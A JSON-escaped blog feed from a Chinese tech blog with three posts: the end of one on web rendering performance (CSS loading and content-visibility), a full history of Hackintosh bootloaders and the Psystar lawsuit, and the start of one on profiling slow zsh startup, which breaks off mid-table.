src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\"> <div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-03</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\"> <div class=\"license-title\">黑苹果的历史</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-09-02</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    